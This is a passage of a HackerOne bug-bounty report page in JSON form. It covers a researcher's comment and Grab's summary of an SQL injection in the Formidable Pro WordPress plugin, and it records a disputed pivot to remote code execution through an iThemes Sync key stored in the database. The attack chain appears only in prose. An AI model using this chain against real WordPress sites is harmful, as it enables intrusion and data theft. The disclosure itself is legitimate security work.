4uSJp6R8rbsBzRSLIFhyP9QTQMq5P15qLdwXnZbOxNVoADzWwgfUfGt%2BOwI%2BEjM3ovXNd1aGU0Ee1TBGk3LBN3uQ8ppV7Xii57PrmCtM4dm9usXbAaaa8f8QiQFPH1YTkHf%2FPe1cgMlFNJFqSrmu3ZMinUb9pxpphywkYT29wP%2Fak4Sy9A3St63iqnDzi8wrdG9%2FGdB7M03pSeaVTcH99G5j%2FqMpFpJxYN8TNlglA1OWgt7QlVOqnq65zCp4szGmwzF1FrjkS%2Bp3wB27lGxlw0v79ozRdwRBFBFvrSgSeToK8vpEBIlnO4uogSsVneM6zoYfyQw3%2F6HqcPg9mVWJmJS4QLMpQTMd%2FMeYn%2F%2Ffl2Vt%2Bb0X2rNtQPeWMGpzHpq6XAiCjZ%2F33fJuN%2B3j9Lmo023GSXKu%2B%2FkZTBp3waVREDqE%2BNeB30X8ZT5%2BW0bqtpGbJe8ig5jtSZzprCWg9v84Utvz3uaa%2Bcjz7MJPPqv8FOusBEHCYkRstnRk5lzIXoX3CRWjAJcL61b1gmhmecG%2Fow23IgJkGaQ5%2B%2FkCWvGrt4rLn9BlUKR84X6ifbCLPwMQevITvtVqg1wdT%2FzOjUyHnqnZVOyLFoqLXk9MNjw1VTb%2FmSNp%2Bd5NsBD5KiAAd50U1%2F1jl5yoSrl0DpEi6Yzv0bFigmUQPNRZeTImBJ2V75RxXBbDSoevWuBT70W%2F8%2BsoyTMqti7McilmsidA1BnI1f8HDTyMQGIoexlo%2BO7e5AiNtCUboKL2ZiertWXe5cEVF9mAVgHpVtz7pIIElyyZjsKslJzP%2B5WRhYUkMYg%3D%3D\u0026X-Amz-Signature=9945f5a4ec7fbe5a13d3cbbbadaa861a308dbf1dae9849d203c3cecf0716e2fe"}],"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2178096,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I was hoping for an actual technical explanation as to why the iThemes Sync RCE vector wouldn't work on this server. If it didn't, then it would have been in everyone's interest to clarify the situation even on this point. It would have been simple to figure it out and resolve one of the main problems of this bounty process.\n\nThe only theoretically possible (though implausible) reason proposed so far is that someone had \"hardened\" the plugin in a way that broke the authentication protocol. Showing presence of modifications in the plugin files would have been a matter of minutes. In practice, something like `ls -l` output would indicate this.\n\nInstead, consistently following the chosen strategy, Grab has now removed the iThemes Sync plugin from the server altogether - despite denying it presented any security risk. Unlike some other WordPress plugins that were recently disabled there, this one seems to have been completely wiped from the filesystem. Presence of plugin files under webroot can be checked via HTTP.\n\nThis probably means nobody can test the PoC or the theory of \"modified version\" any more. We just have to trust that there was an unknown reason, which nobody cared to figure out, why the RCE that works everywhere else didn't work on this server.\n","markdown_message":"\u003cp\u003eI was hoping for an actual technical explanation as to why the iThemes Sync RCE vector wouldn\u0026#39;t work on this server. If it didn\u0026#39;t, then it would have been in everyone\u0026#39;s interest to clarify the situation even on this point. It would have been simple to figure it out and resolve one of the main problems of this bounty process.\u003c/p\u003e\n\n\u003cp\u003eThe only theoretically possible (though implausible) reason proposed so far is that someone had \u0026quot;hardened\u0026quot; the plugin in a way that broke the authentication protocol. Showing presence of modifications in the plugin files would have been a matter of minutes. In practice, something like \u003ccode\u003els -l\u003c/code\u003e output would indicate this.\u003c/p\u003e\n\n\u003cp\u003eInstead, consistently following the chosen strategy, Grab has now removed the iThemes Sync plugin from the server altogether - despite denying it presented any security risk. Unlike some other WordPress plugins that were recently disabled there, this one seems to have been completely wiped from the filesystem. Presence of plugin files under webroot can be checked via HTTP.\u003c/p\u003e\n\n\u003cp\u003eThis probably means nobody can test the PoC or the theory of \u0026quot;modified version\u0026quot; any more. We just have to trust that there was an unknown reason, which nobody cared to figure out, why the RCE that works everywhere else didn\u0026#39;t work on this server.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-23T01:14:55.915Z","updated_at":"2017-11-23T01:15:58.340Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"grab","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":5905,"category":"team","content":"The researcher reported that it was possible to exploit previously unknown SQL injection in a WordPress plugin called Formidable Pro which was fixed immediately. He was able to gain read access on wordpress database and provided us all the relevant details (PoC) required for us to reproduce the issue.\n\n_**As also stated on our Policy page:**_\n\n```\nOur rewards are impact-based. This means, for example, that we will issue a relatively high reward\nfor a vulnerability that has the potential to leak complete dataset of confidential data, but that we\nwill issue  lower reward for a vulnerability that allows an attacker to access to an isolated and limited\ndataset. When we have our reward meetings, we always ask one question: If a malicious attacker\nabuses this, how bad off are we? We assume the worst and pay out the bug accordingly.\n\nIf a single fix fixes multiple vulnerabilities, we treat this as a single vulnerability. \nFor example, if you find 3 vulnerabilities in a WordPress plugin we use, and our fix is to remove \nthe plugin, this will receive a single bounty, determined, as always, by impact.\n```\n\nTherefore, in order to be able to accurately identify the overall impact on business, we further investigated to find out the extent of data leakage. During our investigation, we found that database was storing a dataset (representing ~0.6%) containing our driver partners PII.\n\nResearcher also reported 2 other different security issues on same plugin, Formidable Pro. All the 3 vulnerabilities reported were on the latest plugin, and having no updates available at the time by the plugin developers. Deleting the plugin was a single fix.\n\nAfter assigning the severity based on the data exposure the researcher pointed out that, there is a way to pivot from the DB to wordpress admin dashboard exploiting iThemes-Sync authentication key which was exposed in a database. After our investigation we believe that pivoting was not possible in the context because of the server hardening. We fairly asked him to show specific evidence of his new finding in order to reassess the bounty. Because the SQL injection was already fixed the researcher was not able to perform any remote code execution but he did provided PoC for helping us to reproduce the RCE. From his understanding the only values required for performing RCE was user id and authentication key (which was stored in plaintext in a DB).\n\nWhile investigating this RCE using researcher's provided PoC we figured out that those two values are not enough for reproducing the RCE because of the following error message:\n\n```\nThe hash could not be validated as a correct hash.\n```\n\nOn checking with ithemes developers  on email, they responded with the following:\n\n```\nWe're using randomly generated salts for each site to build the hashes, but we can't go into specifics, for obvious security reasons.\n```\n\nSince neither we or the researcher were able to confirm the RCE we couldn't reassess the bounty.\n\nBased on above data points collected through our investigation, we decided to award the researcher 4500 USD. Also, to appreciate the researcher for spending valuable time and efforts in submitting other 2 detailed bug reports to us, on the same plugin. Since these 2 bug reports were considered duplicate because of single fix, yet we decided to award 250 USD on each duplicate bug report as well.\n\nNeedless to say, we take ALL reported vulnerabilities, very seriously and investigate them to best of our technical abilities. We have awarded 10,000 USD bounty to researchers, who have submitted vulnerabilities with critical impact, in the past and we will continue to do so in the future as well. \n\nAt the end of the day, all these efforts made by H1 triage team, H1 researchers and Grab security team, comes down to overall risk and impact to the business. However, we always aim to be fair. Some researchers won't agree with some of our decisions, but we're paying out to the best of our ethical ability and trust that the majority of researchers will consider their rewards fair and in many cases generous.\n\nWe would like to once again thank the researcher for his great report and allowing us to fix this issue. We really appreciate his help in keeping Grab and our customers safe and secure. ","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eThe researcher reported that it was possible to exploit previously unknown SQL injection in a WordPress plugin called Formidable Pro which was fixed immediately. He was able to gain read access on wordpress database and provided us all the relevant details (PoC) required for us to reproduce the issue.\u003c/p\u003e\n\n\u003cp\u003e\u003cu\u003e\u003cstrong\u003eAs also stated on our Policy page:\u003c/strong\u003e\u003c/u\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eOur rewards are impact-based. This means, for example, that we will issue a relatively high reward\nfor a vulnerability that has the potential to leak complete dataset of confidential data, but that we\nwill issue  lower reward for a vulnerability that allows an attacker to access to an isolated and limited\ndataset. When we have our reward meetings, we always ask one question: If a malicious attacker\nabuses this, how bad off are we? We assume the worst and pay out the bug accordingly.\n\nIf a single fix fixes multiple vulnerabilities, we treat this as a single vulnerability. \nFor example, if you find 3 vulnerabilities in a WordPress plugin we use, and our fix is to remove \nthe plugin, this will receive a single bounty, determined, as always, by impact.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTherefore, in order to be able to accurately identify the overall impact on business, we further investigated to find out the extent of data leakage. During our investigation, we found that database was storing a dataset (representing ~0.6%) containing our driver partners PII.\u003c/p\u003e\n\n\u003cp\u003eResearcher also reported 2 other different security issues on same plugin, Formidable Pro. All the 3 vulnerabilities reported were on the latest plugin, and having no updates available at the time by the plugin developers. Deleting the plugin was a single fix.\u003c/p\u003e\n\n\u003cp\u003eAfter assigning the severity based on the data exposure the researcher pointed out that, there is a way to pivot from the DB to wordpress admin dashboard exploiting iThemes-Sync authentication key which was exposed in a database. After our investigation we believe that pivoting was not possible in the context because of the server hardening. We fairly asked him to show specific evidence of his new finding in order to reassess the bounty. Because the SQL injection was already fixed the researcher was not able to perform any remote code execution but he did provided PoC for helping us to reproduce the RCE. From his understanding the only values required for performing RCE was user id and authentication key (which was stored in plaintext in a DB).\u003c/p\u003e\n\n\u003cp\u003eWhile investigating this RCE using researcher\u0026#39;s provided PoC we figured out that those two values are not enough for reproducing the RCE because of the following error message:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eThe hash could not be validated as a correct hash.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOn checking with ithemes developers  on email, they responded with the following:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eWe\u0026#39;re using randomly generated salts for each site to build the hashes, but we can\u0026#39;t go into specifics, for obvious security reasons.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSince neither we or the researcher were able to confirm the RCE we couldn\u0026#39;t reassess the bounty.\u003c/p\u003e\n\n\u003cp\u003eBased on above data points collected through our investigation, we decided to award the researcher 4500 USD. Also, to appreciate the researcher for spending valuable time and efforts in submitting other 2 detailed bug reports to us, on the same plugin. Since these 2 bug reports were considered duplicate because of single fix, yet we decided to award 250 USD on each duplicate bug report as well.\u003c/p\u003e\n\n\u003cp\u003eNeedless to say, we take ALL reported vulnerabilities, very seriously and investigate them to best of our technical abilities. We have awarded 10,000 USD bounty to researchers, who have submitted vulnerabilities with critical impact, in the past and we will continue to do so in the future as well. \u003c/p\u003e\n\n\u003cp\u003eAt the end of the day, all these efforts made by H1 triage team, H1 researchers and Grab security team, comes down to overall risk and impact to the business. However, we always aim to be fair. Some researchers won\u0026#39;t agree with some of our decisions, but we\u0026#39;re paying out to the best of our ethical ability and trust that the majority of researchers will consider their rewards fair and in many cases generous.\u003c/p\u003e\n\n\u003cp\u003eWe would like to once again thank the researcher for his great report and allowing us to fix this issue. We really appreciate his help in keeping Grab and our customers safe and secure. \u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}